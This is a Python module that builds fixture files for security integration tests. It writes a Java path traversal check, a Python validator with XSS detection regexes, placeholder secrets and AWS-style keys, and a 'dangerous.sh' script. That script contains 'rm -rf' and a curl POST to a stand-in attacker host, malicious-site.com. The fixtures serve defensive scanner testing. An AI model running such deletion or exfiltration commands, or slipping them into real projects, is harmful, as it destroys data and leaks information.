"""Fixture builders for Phase 7 security integration tests."""

import json
from pathlib import Path

SECURE_SERVICE_JAVA = """
package com.secure;

import java.security.SecureRandom;
import java.util.logging.Logger;

public class SecureService {
    private static final Logger logger = Logger.getLogger(SecureService.class.getName());
    private final SecureRandom random = new SecureRandom();

    public String generateToken() {
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);
        return bytesToHex(bytes);
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder result = new StringBuilder();
        for (byte b : bytes) {
            result.append(String.format("%02x", b));
        }
        return result.toString();
    }

    public boolean validateInput(String input) {
        if (input == null || input.trim().isEmpty()) {
            logger.warning("Invalid input: null or empty");
            return false;
        }

        // セキュリティチェック
        if (input.contains("../") || input.contains("..\\\\")) {
            logger.warning("Path traversal attempt detected");
            return false;
        }

        return true;
    }
}
"""


SECURITY_VALIDATOR_PY = r"""
import re
import hashlib
import secrets
from typing import Optional

class SecurityValidator:
    def __init__(self):
        self.path_traversal_pattern = re.compile(r'\.\.[\\/]')
        self.suspicious_patterns = [
            r'<script[^>]*>',
            r'javascript:',
            r'vbscript:',
            r'onload\s*=',
            r'onerror\s*=',
        ]

    def validate_path(self, path: str) -> bool:
        if not path:
            return False

        # パストラバーサル検出
        if self.path_traversal_pattern.search(path):
            return False

        # 絶対パス禁止
        if path.startswith('/') or (len(path) > 1 and path[1] == ':'):
            return False

        return True

    def validate_query(self, query: str) -> bool:
        if not query:
            return False

        # 悪意のあるパターン検出
        for pattern in self.suspicious_patterns:
            if re.search(pattern, query, re.IGNORECASE):
                return False

        return True

    def generate_secure_token(self) -> str:
        return secrets.token_urlsafe(32)

    def hash_password(self, password: str, salt: Optional[str] = None) -> tuple:
        if salt is None:
            salt = secrets.token_hex(16)

        password_hash = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt.encode('utf-8'),
            100000
        )

        return password_hash.hex(), salt
"""


SENSITIVE_CONFIG_PROPERTIES = """
# 機密設定ファイル（テスト用）
database.password=secret123
api.key=sk-1234567890abcdef
jwt.secret=super_secret_key_for_testing
admin.password=admin123
"""


DANGEROUS_SCRIPT_SH = """#!/bin/bash
# 危険なスクリプト（テスト用）
rm -rf /tmp/test_data
curl -X POST http://malicious-site.com/data
echo "Potentially dangerous operation"
"""


def create_secure_project_structure(project_root: Path) -> None:
    """Create the safe source tree used by security integration tests."""
    _write_secure_java_service(project_root)
    _write_python_security_validator(project_root)


def create_security_test_files(project_root: Path) -> None:
    """Create scanner fixture files used by security integration tests."""
    sensitive_dir = project_root / "sensitive"
    sensitive_dir.mkdir()
    aws_credential_name = "aws_" + "secret_" + "key"

    (sensitive_dir / "config.properties").write_text(SENSITIVE_CONFIG_PROPERTIES)

    (sensitive_dir / "credentials.json").write_text(
        json.dumps(
            {
                "aws_access_key": "AKIA" + "IOSFODNN7EXAMPLE",
                aws_credential_name: "wJalrXUtnFEMI/"
                + "K7MDENG/bPxRfiCYEXAMPLEKEY",
                "database_url": "postgresql://user"
                + ":"
                + "password"
                + "@localhost:5432/db",
                "private_key": "-----BEGIN "
                + "PRIVATE KEY-----\n"
                + "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...",
            },
            indent=2,
        )
    )

    scripts_dir = project_root / "scripts"
    scripts_dir.mkdir()

    (scripts_dir / "dangerous.sh").write_text(DANGEROUS_SCRIPT_SH)


def _write_secure_java_service(project_root: Path) -> None:
    java_dir = project_root / "src" / "main" / "java" / "com" / "secure"
    java_dir.mkdir(parents=True)
    (java_dir / "SecureService.java").write_text(SECURE_SERVICE_JAVA)


def _write_python_security_validator(project_root: Path) -> None:
    python_dir = project_root / "python" / "security"
    python_dir.mkdir(parents=True)
    (python_dir / "validator.py").write_text(SECURITY_VALIDATOR_PY)
